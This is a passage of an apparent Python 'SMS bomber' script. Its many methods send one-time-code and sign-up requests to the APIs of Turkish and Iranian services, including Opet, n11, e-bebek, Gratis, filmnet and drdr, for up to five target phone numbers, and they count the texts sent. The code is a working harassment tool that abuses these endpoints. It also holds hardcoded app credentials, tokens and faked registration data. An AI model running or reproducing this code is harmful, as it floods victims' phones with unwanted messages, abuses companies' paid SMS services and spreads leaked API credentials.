                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobilapi.petrolofisi.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilapi.petrolofisi.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #totalistasyonlari.com.tr
    def Total(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={numara}&api_key=GetDocuments%0A", verify=False)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapi.totalistasyonlari.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.totalistasyonlari.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue            
            
    #opet.com.tr
    def Opet(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api.opet.com.tr:443/api/authentication/register"
                    json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(numara), "opetKvkkAndEtk": True, "plate": "31ABC31"}
                    r = requests.post(url, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.opet.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.opet.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #dolap.com
    def Dolap(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://api-gateway.dolap.com:443/member"
                    headers = {"Content-Type": "application/json", "Accept": "*/*", "Appversion": "359", "Accept-Language": "tr-TR,tr;q=0.9", "Accept-Encoding": "gzip, deflate", "Categorygroup": "WOMAN", "Access-Token": "", "User-Agent": "dolap/2 CFNetwork/1335.0.3 Darwin/21.6.0", "Appplatform": "ios"}
                    json={"advertisingId": "", "campaignAgreement": False, "email": self.mail, "memberCookie": "", "membershipAgreement": True, "nickName": "tingirifistik", "password": "31ABC..abc31", "phoneNumber": numara}
                    r = requests.put(url, headers=headers, json=json)
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api-gateway.dolap.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api-gateway.dolap.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #heymobility.tech
    def Hey(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                    r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}", headers=headers)
                    if (r.json()["IsSuccess"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> heyapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> heyapi.heymobility.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            

    #tazi.tech
    def Tazi(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
                    json={"cep_tel": numara, "cep_tel_ulkekod": "90"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["kod"]) == "0000":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapiv2.tazi.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapiv2.tazi.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #isbike.istanbul
    def Isbike(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "http://app.isbike.istanbul:80/api/uye/otpsms"
                    headers = {"Content-Type": "application/json", "Connection": "close", "Accept": "application/json", "User-Agent": "isbike/1.3.5 (tr.gov.ibb.isbikeNew; build:74; iOS 15.6.1) Alamofire/5.5.0", "Authorization": "Basic aXNiaWtlX3VzcjppX3NiaWtlMTQ/LSo1MyE=", "Accept-Encoding": "gzip, deflate", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9"}
                    json={"cep_tel": numara, "cep_tel_ulkekod": 90, "tip": "MBL_UYE_LOGIN"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["sonuc"]["aciklama"]) == "İşlem Başarılı":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> app.isbike.istanbul "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> app.isbike.istanbul "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #n11.com
    def N11(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
                    headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
                    json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": numara, "userType": "BUYER"}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.json()["isSuccess"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobileapi.n11.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobileapi.n11.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #joker.com.tr
    def Joker(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"
                    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
                    data = {"phone": numara}
                    r = requests.post(url, headers=headers, data=data)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> joker.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> joker.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #e-bebek.com
    def Ebebek(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api2.e-bebek.com:443/authorizationserver/oauth/token?lang=tr&curr=EUR&client_secret=secret&grant_type=client_credentials&client_id=trusted_client")
                    auth = (r.json()["access_token"])
                    url = "https://api2.e-bebek.com:443/ebebekwebservices/v2/ebebek/users/anonymous/validate?curr=TRY&lang=tr"
                    headers = {"Content-Type": "application/json", "Authorization": f"Bearer {auth}"}
                    json={"email": self.mail, "emailAllow": False, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "smsAllow": True, "uid": numara}
                    r = requests.post(url, headers=headers, json=json)
                    if r.json()["status"] == "SUCCESS":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api2.e-bebek.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api2.e-bebek.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #sakasu.com.tr
    def Saka(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
                    json={"gsm": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["status"]) == 1 :
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mobilcrm2.saka.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> mobilcrm2.saka.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #gofody.com
    def Gofody(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://backend.gofody.com:443/api/v1/enduser/register/"
                    json={"country_code": "90", "phone": numara}
                    r = requests.post(url, json=json)
                    if (r.json()["success"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> backend.gofody.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> backend.gofody.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    #madamecoco.com
    def Madame(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.madamecoco.com:443/users/registration/"
                    headers = {"Content-Type": "multipart/form-data; boundary=mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.madamecoco.com/", "User-Agent": "Madame%20Coco/1 CFNetwork/1335.0.3 Darwin/21.6.0"}
                    data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
                    r = requests.post(url, headers=headers, data=data)
                    if (r.status_code) == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> madamecoco.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> madamecoco.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #balikesiruludag.com.tr
    def Buludag(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={numara}")
                    if r.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bilet.balikesiruludag.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bilet.balikesiruludag.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #evidea.com
    def Evidea(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.evidea.com:443/users/register/"
                    headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
                    data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{numara}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
                    r = requests.post(url, headers=headers, data=data)      
                    if r.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> evidea.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> evidea.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #koctas.com.tr
    def Koctas(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
                    data = {"givePermission": "true", "mobileNumber": numara}
                    r = requests.post(url, data=data)
                    if (r.json()["status"]) == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> occ2.koctas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> occ2.koctas.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #gratis.com
    def Gratis(self):
            
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
                    url = "https://ivt.mobildev.com:443/data/0e80tyg8"
                    headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
                    json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": numara, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
                    r = requests.post(url, headers=headers, json=json)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> ivt.mobildev.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> ivt.mobildev.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue


    def filmnet(phone):
        fnU = f"https://api-v2.filmnet.ir/access-token/users/{phone}/otp"
        fNh = {'Connection': 'keep-alive','Accept': 'application/json, text/plain, */*','DNT': '1','X-Platform': 'Web','User-Agent': generate_user_agent(os="win"),'Origin': 'https://filmnet.ir','Sec-Fetch-Site': 'same-site','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://filmnet.ir/','Accept-Language': 'fa,en-US;q=0.9,en;q=0.8','Cache-Control': 'no-cache','Accept-Encoding': 'gzip, deflate'}
        try:
            get(url=fnU, headers=fNh)
            return True
        except:
            pass


    def drdr(phone):
        dru = f"https://drdr.ir/api/registerEnrollment/sendDisposableCode"
        drh = {'Connection': 'keep-alive','Accept': 'application/json','Authorization': 'hiToken','User-Agent': generate_user_agent(os="win"),'Content-Type': 'application/json;charset=UTF-8','Origin': 'https://drdr.ir','Referer': 'https://drdr.ir/','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate'}
        try:
            post(url=dru, headers=drh, params={"phoneNumber": phone, "userType": "PATIENT"})
            return True
        except:
            pass



    def itoll(phone):
        itJ = {'mobile': phone}
        itU = 'https://app.itoll.ir/api/v1/auth/login'
        itH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'fa','content-type': 'application/json;charset=UTF-8','origin': 'https://itoll.ir','referer': 'https://itoll.ir/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=itU, headers=itH, json=itJ)
            return True
        except:
            pass




    def namava(num):
        rhead = {"user-agent": generate_user_agent()}
        try:
            post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json={"UserName": phone},headers=rhead ,timeout=5)
            return True
        except:
            pass



    def anar(phone):
        anrJ = {'user': phone, 'app_id': 99}
        anrU = 'https://api.anargift.com/api/people/auth'
        anrH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '34','content-type': 'application/json;charset=UTF-8','origin': 'https://anargift.com','referer': 'https://anargift.com/','user-agent': generate_user_agent(os="linux")}
        try:
            post(url=anrU, headers=anrH, json=anrJ)
            return True
        except:
            pass


    def azki(phone):
        azkU = f'https://www.azki.com/api/core/app/user/checkLoginAvailability/%7B"phoneNumber":"azki_{phone}"%7D'
        azkH = {'accept': 'application/json, text/plain, */*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==','device': 'web','deviceid': '6','password': 'BimitoSecret','origin': 'https://www.azki.com','referer': 'https://www.azki.com/','user-agent': generate_user_agent(os="linux"),'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE','username': 'BimitoClient'
        }
        try:
            post(url=azkU, headers=azkH)
            return True
        except:
            pass


   

    def ragham_call(phone):
        # Call and sms 
        n4 = {"phone":phone}
        rhead = {"user-agent": generate_user_agent()}
        try: 
            post(url="https://web.raghamapp.com/api/users/code",json=n4, headers=rhead)
            return True
        except:
            pass
    

    # dsmartgo.com.tr
    def Dsmartgo(self):
        dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	"IsSubscriber": "true",
